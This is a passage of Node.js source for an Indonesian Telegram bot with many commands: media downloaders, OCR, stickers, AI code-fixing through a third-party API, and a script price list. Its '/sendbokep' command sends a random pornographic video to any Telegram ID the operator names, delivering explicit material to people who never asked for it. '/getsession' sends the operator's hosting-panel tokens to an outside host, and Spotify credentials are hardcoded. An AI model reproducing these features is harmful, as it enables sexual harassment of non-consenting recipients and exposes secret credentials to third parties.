  "https://files.catbox.moe/cdl11t.mp4",
  "https://files.catbox.moe/zjo5r6.mp4",
  "https://files.catbox.moe/7i6amv.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  "https://files.catbox.moe/fxe94h.mp4",
  "https://files.catbox.moe/52oh63.mp4",
  "https://files.catbox.moe/ite58a.mp4",
  "https://files.catbox.moe/svw26n.mp4",
  "https://files.catbox.moe/bv5yaa.mp4",
  "https://files.catbox.moe/ozk5xr.mp4",
  "https://files.catbox.moe/926k9a.mp4"
];
let lastVideoIndex = -1;

function pickRandomVideo() {
  let i;
  do {
    i = Math.floor(Math.random() * videoList.length);
  } while (i === lastVideoIndex && videoList.length > 1);

  lastVideoIndex = i;
  return videoList[i];
}

// --- Command: /sendbokep <telegram_id> ---
bot.onText(/\/sendbokep\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1];

  let waitingMsg = await bot.sendMessage(
    chatId,
    `🔍 *Memeriksa pengguna...*`,
    { parse_mode: "Markdown" }
  );

  try {
    const videoUrl = pickRandomVideo();

    // Kirim langsung ke target Telegram
    await bot.sendVideo(targetId, videoUrl, {
      caption: "📹 Nih videonya bre...",
    });

    await bot.editMessageText(
      `✅ *Terkirim sukses ke:* \`${targetId}\``,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );

  } catch (err) {
    await bot.editMessageText(
      `❌ *Gagal mengirim:* ${err.message}`,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// Jika format salah
bot.onText(/\/sendbokep$/, (msg) => {
  bot.sendMessage(msg.chat.id, "Format benar:\n/sendbokep <id_telegram>");
});

bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto dulu baru ketik /hd cok."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendPhoto(chatId, result, {
      caption: `✅ Foto berhasil di-HD cok!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});

bot.onText(/^\/tiktokdl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  await bot.sendMessage(chatId, "📥 Tunggu bentar bre, lagi download video TikTok-nya...");

  try {
    const api = `https://api.nekolabs.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data dari API NekoLabs bre.");
    }

    const result = data.result;

    const caption =
      `🎬 *TikTok Downloader*\n\n` +
      `👤 *${result.author.name}* (${result.author.username})\n` +
      `🎶 *${result.music_info.title}* - ${result.music_info.author}\n` +
      `❤️ ${result.stats.like}  💬 ${result.stats.comment}  🔁 ${result.stats.share}\n` +
      `🕒 ${result.create_at}`;

    // Kirim video
    await bot.sendVideo(chatId, result.videoUrl, {
      caption,
      parse_mode: "Markdown",
    });

    // Kirim sound/music
    await bot.sendAudio(chatId, result.musicUrl, {
      filename: `${result.music_info.title}.mp3`,
      caption: `🎵 ${result.music_info.title} - ${result.music_info.author}`,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("TIKTOK ERROR:", err.message);
    bot.sendMessage(chatId, "❌ Gagal ambil data TikTok bre, coba lagi nanti.");
  }
});

bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "🔎 Nyari lagu di Spotify... tunggu bentar bre 🎧");

    const api = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result || !data.result.length) {
      return bot.sendMessage(chatId, "❌ Gagal nemuin lagu di Spotify bre!");
    }

    let caption = "🎶 *Hasil Pencarian Spotify:*\n\n";

    data.result.slice(0, 10).forEach((item, i) => {
      caption += `*${i + 1}. ${item.title}*\n`;
      caption += `👤 ${item.artist}\n`;
      caption += `🕒 ${item.duration}\n`;
      caption += `🔗 [Buka Spotify](${item.url})\n\n`;
    });

    // Kirim cover + caption
    bot.sendPhoto(chatId, data.result[0].cover, {
      caption,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("Spotify Search Error:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencari lagu di Spotify bre.");
  }
});

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});


bot.onText(/\/otp (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userOtp = match[1];

  if (userOtp === OTP_CODE) {
    verifiedUsers.add(chatId);
    bot.sendMessage(
      chatId,
      "✅ OTP benar! Ketik /start lagi untuk membuka menu utama."
    );
  } else {
    bot.sendMessage(chatId, "❌ OTP salah. Silakan coba lagi.");
  }
});  

module.exports = bot;

bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const { data } = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
    });

    const tmpPath = path.join(process.cwd(), "Session.json");
    fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: "📦 Session file requested",
    });

    fs.unlinkSync(tmpPath); // hapus file setelah dikirim

  } catch (err) {
    console.error("GetSession Error:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  }
});

bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Contoh:\n/bratvid woi kontol");
  }

  bot.sendMessage(chatId, "🎬 Lagi bikin sticker videonya bre...");

  try {
    const res = await fetch(`https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    const buffer = Buffer.from(await res.arrayBuffer()); // ✅ FIX disini

    const tmpFile = path.join(__dirname, `bratvid_${Date.now()}.webm`);
    fs.writeFileSync(tmpFile, buffer);

    await bot.sendSticker(chatId, tmpFile);

    fs.unlinkSync(tmpFile);
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Gagal generate sticker video.");
  }
});

bot.onText(/^\/qc(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  try {
    // Cek kalau user nge-reply pesan orang
    let target = msg.from;
    let messageText = text;

    if (msg.reply_to_message) {
      target = msg.reply_to_message.from;
      messageText = msg.reply_to_message.text;
    }

    if (!messageText) {
      return bot.sendMessage(
        chatId,
        "⚠️ Contoh:\n- /qc Halo dunia\n- Balas teks orang → /qc"
      );
    }

    // warna random
    const warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
    const reswarna = warna[Math.floor(Math.random() * warna.length)];

    // Ambil foto profil target
    let ppuser = "https://files.catbox.moe/gqs7oz.jpg"; // default fallback

    try {
      const photos = await bot.getUserProfilePhotos(target.id);
      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const fileLink = await bot.getFileLink(fileId);
        ppuser = fileLink;
      }
    } catch {}

    // body API
    const obj = {
      type: "quote",
      format: "png",
      backgroundColor: reswarna,
      width: 512,
      height: 768,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: target.first_name || "Unknown",
            photo: { url: ppuser },
          },
          text: messageText,
          replyMessage: {},
        },
      ],
    };

    // Request API
    const json = await axios.post("https://bot.lyo.su/quote/generate", obj, {
      headers: { "Content-Type": "application/json" },
    });

    const buffer = Buffer.from(json.data.result.image, "base64");

    // kirim sticker
    await bot.sendSticker(chatId, buffer);

  } catch (err) {
    console.error("QC Error:", err.message);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/ocr$/, async (msg) => {
  const chatId = msg.chat.id;

  // Pastikan user reply gambar
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, "📸 *Balas gambar* yang mau di OCR, bre.", { parse_mode: "Markdown" });
  }

  // Ambil photo resolusi tertinggi
  const photo = msg.reply_to_message.photo.slice(-1)[0];
  const fileId = photo.file_id;

  await bot.sendMessage(chatId, "⏳ Sedang memproses OCR mu bre...");

  try {
    // Ambil URL gambar dari Telegram (ini WAJIB, karena Telegram tidak langsung kasih URL foto)
    const fileLink = await bot.getFileLink(fileId);

    // OCR API Tetap → Tidak diganti
    const { data } = await axios.get(
      `https://api.deline.my.id/tools/ocr?url=${encodeURIComponent(fileLink)}`
    );

    if (!data?.status) throw new Error(data?.error || "API return false");

    // Adaptasi struktur output OCR
    const raw = data?.Text ?? data?.text ?? data?.extractedText ?? "";
    const text = String(raw).replace(/\\n/g, "\n").trim();

    bot.sendMessage(chatId, text || "📭 Ga ada teks nya bre.");

  } catch (e) {
    bot.sendMessage(chatId, `⚠️ Error bre:\n${e.message}`);
  }
});

bot.onText(/\/fixeror/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixeror", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

const MAINT_FILE = './#necro ♰/maintenance.json';

// helper: buat file kalau belum ada
function ensureMaintenanceFile() {
  if (!fs.existsSync('./#necro ♰')) fs.mkdirSync('./#necro ♰', { recursive: true });
  if (!fs.existsSync(MAINT_FILE)) {
    fs.writeFileSync(MAINT_FILE, JSON.stringify({ enabled: false }, null, 2));
  }
}
ensureMaintenanceFile();

// baca status maintenance (synchronous sederhana)
function readMaintenance() {
  try {
    const raw = fs.readFileSync(MAINT_FILE, 'utf8');
    const data = JSON.parse(raw);
    return Boolean(data.enabled);
  } catch (e) {
    console.error("Gagal membaca maintenance file:", e.message);
    return false;
  }
}

// set maintenance dan simpan
function setMaintenance(status) {
  try {
    fs.writeFileSync(MAINT_FILE, JSON.stringify({ enabled: Boolean(status) }, null, 2));
    return true;
  } catch (e) {
    console.error("Gagal menulis maintenance file:", e.message);
    return false;
  }
}

// helper publik
function isMaintenance() {
  return readMaintenance();
}

// watch file agar runtime ikut update bila file diubah manual
try {
  fs.watch(MAINT_FILE, (ev) => {
    if (ev === 'change') {
      console.log("[MAINT] maintenance.json berubah. Status sekarang:", isMaintenance());
    }
  });
} catch (e) {
  // ignore watch errors
}

// Telegram command: setmaintenance on|off
bot.onText(/^\/setmaintenance\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();

  // only owner or admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `❌ Akses ditolak. Hanya Owner/Admin yang dapat melakukan ini.`);
  }

  const status = mode === 'on';
  const ok = setMaintenance(status);
  if (!ok) {
    return bot.sendMessage(chatId, `❌ Gagal mengubah status maintenance. Periksa log server.`);
  }

  const msgText = status ? `✅ Mode maintenance di AKTIFKAN. Hanya Owner/Admin yang dapat menjalankan perintah sensitif.` :
                          `✅ Mode maintenance di NON-AKTIFKAN. Bot beroperasi normal.`;

  bot.sendMessage(chatId, msgText);
});

// Telegram command: /maintenance -> cek status
bot.onText(/^\/maintenance$/i, (msg) => {
  const chatId = msg.chat.id;
  const status = isMaintenance();
  const text = status ? "🔴 BOT SEDANG MAINTENANCE (ON)" : "🟢 BOT AKTIF (OFF)";
  bot.sendMessage(chatId, text);
});
// ---------- END: Maintenance Feature ---------- //

bot.onText(/\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username || msg.from.first_name;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "⏳ Lagi nyari lagu di Spotify, tunggu bentar bre...");

    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data lagu dari Spotify!");
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    const caption = `
<blockquote>🎵 ${title || "Unknown"}</blockquote>
<blockquote>👤 ${artist || "Unknown"}</blockquote>
<blockquote>🕒 Durasi: ${duration || "-"}</blockquote>
`;

    await bot.sendPhoto(chatId, cover, {
      caption,
      parse_mode: "HTML",
    });

    await bot.sendAudio(chatId, downloadUrl, {
      title: title || "Unknown Title",
      performer: artist || "Unknown Artist",
    });
  } catch (err) {
    console.error("Play Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memutar lagu bre.");
  }
});

bot.onText(/^\/listharga$/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, `
<blockquote>💰 <b>DAFTAR HARGA SCRIPT BOT</b></blockquote>
Klik tombol di bawah untuk melihat harga lengkap script bot:
  `, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📄 Lihat Harga Script", callback_data: "lihat_harga" }]
      ]
    }
  });
});

// Handler tombol
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "lihat_harga") {
    bot.sendMessage(chatId, `
<blockquote>💬 <b>SCRIPT WHATSAPP BOT</b></blockquote>
<blockquote>LIST HARGA SCRIPT Evo Enggine</blockquote>
<blockquote>• FREE UPDATE 10K
• RESELLER 20K
• PARTNER 30K
• OWNER 40K
contack: @FaiqNotDev</blockquote>
    `, { parse_mode: "HTML" });
  }

  bot.answerCallbackQuery(callbackQuery.id);
});


const SPOTIFY_CLIENT_ID = "e791953ecb0540d898a5d2513c9a0dd2";
const SPOTIFY_CLIENT_SECRET = "23e971c5b0ba4298985e8b00ce71d238";

// Fungsi ambil token Spotify
async function getSpotifyToken() {
  const res = await fetch("https://accounts.spotify.com/api/token", {
    method: "POST",
    headers: {
      "Authorization":
        "Basic " +
        Buffer.from(`${SPOTIFY_CLIENT_ID}:${SPOTIFY_CLIENT_SECRET}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "grant_type=client_credentials",
  });
  const data = await res.json();
  return data.access_token;
}

// Fungsi cari lagu di Spotify
async function searchSpotify(query) {
  const token = await getSpotifyToken();
  const res = await fetch(
    `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  const data = await res.json();
  if (data.tracks?.items?.length === 0) return null;
  return data.tracks.items[0];
}

// Command /song
bot.onText(/^\/song(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "🎵 Gunakan format:\n`/song [judul lagu]`\nContoh: `/song shape of you`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `🔍 Mencari *${query}* di Spotify...`, {
    parse_mode: "Markdown",
  });

  try {
    const song = await searchSpotify(query);
    if (!song) {
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan di Spotify.");
    }

    const title = song.name;
    const artist = song.artists.map(a => a.name).join(", ");
    const album = song.album.name;
    const url = song.external_urls.spotify;
    const cover = song.album.images[0]?.url;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎧 Dengar di Spotify", url: url }]
        ]
      }
    };

    await bot.sendPhoto(chatId, cover, {
      caption: `🎵 *${title}*\n👤 ${artist}\n💽 Album: ${album}`,
      parse_mode: "Markdown",
      ...keyboard
    });
  } catch (err) {
    console.error("Error /song:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mencari lagu.");
  }
});

bot.onText(/^\/shortlink(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(
      chatId,
      "🔗 Kirim link yang ingin dipendekkan!\n\nContoh:\n`/shortlink https://example.com/artikel/panjang/banget`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Gunakan TinyURL API (tidak butuh API key)
    const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Gagal memendekkan link");
    }

    await bot.sendMessage(
      chatId,
      `✅ *Link berhasil dipendekkan!*\n\n🔹 Asli: ${url}\n🔹 Pendek: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error shortlink:", err);
    bot.sendMessage(chatId, "⚠️ Gagal memendekkan link. Coba lagi nanti.");
  }
});

bot.onText(/^\/fileinfo$/, (msg) => {
  bot.sendMessage(msg.chat.id, "📂 Kirim file yang mau kamu cek infonya!");
});

// Saat user kirim file, foto, audio, atau dokumen
bot.on("document", async (msg) => handleFile(msg, "document"));
bot.on("photo", async (msg) => handleFile(msg, "photo"));
bot.on("video", async (msg) => handleFile(msg, "video"));
bot.on("audio", async (msg) => handleFile(msg, "audio"));

async function handleFile(msg, type) {
  const chatId = msg.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = msg.document.file_id;
    fileName = msg.document.file_name;
  } else if (type === "photo") {
    const photo = msg.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = msg.video.file_id;
    fileName = msg.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = msg.audio.file_id;
    fileName = msg.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *Informasi File*
━━━━━━━━━━━━━━━━
📄 Nama: ${fileName}
📏 Ukuran: ${fileSize}
🧩 Ekstensi: ${fileExt || "-"}
🔗 URL: [Klik di sini](${fileUrl})
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown", disable_web_page_preview: false });
  } catch (err) {
    console.error("❌ Gagal ambil info file:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mendapatkan info file. Coba kirim ulang filenya.");
  }
}

// Fungsi bantu untuk format ukuran file
function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/sticker$/, (msg) => {
  bot.sendMessage(msg.chat.id, "🖼️ Kirim gambar yang mau dijadiin stiker!");
});

// Saat user kirim foto
bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;
  const photo = msg.photo.pop(); // ambil resolusi tertinggi
  const fileId = photo.file_id;

  try {
    // Ambil file URL dari Telegram
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Unduh gambar sementara
    const res = await fetch(fileUrl);
    const buffer = await res.arrayBuffer();
    const tempPath = path.join("./", `temp_${chatId}.jpg`);
    fs.writeFileSync(tempPath, Buffer.from(buffer));

    // Kirim sebagai stiker
    await bot.sendSticker(chatId, fs.createReadStream(tempPath));

    // Hapus file sementara
    fs.unlinkSync(tempPath);
  } catch (err) {
    console.error("❌ Gagal buat stiker:", err);
    bot.sendMessage(chatId, "⚠️ Gagal buat stiker. Coba kirim ulang gambarnya.");
  }
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©FaiqNotDev`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});

bot.onText(/^\/logo (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  try {
    // Gunakan layanan FlamingText (gratis, no API key)
    const logoUrl = `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await bot.sendMessage(chatId, `🖋️ Logo kamu siap!\nTeks: *${text}*`, { parse_mode: "Markdown" });
    await bot.sendPhoto(chatId, logoUrl, { caption: "✨ Logo by FlamingText" });
  } catch (err) {
    console.error(err);
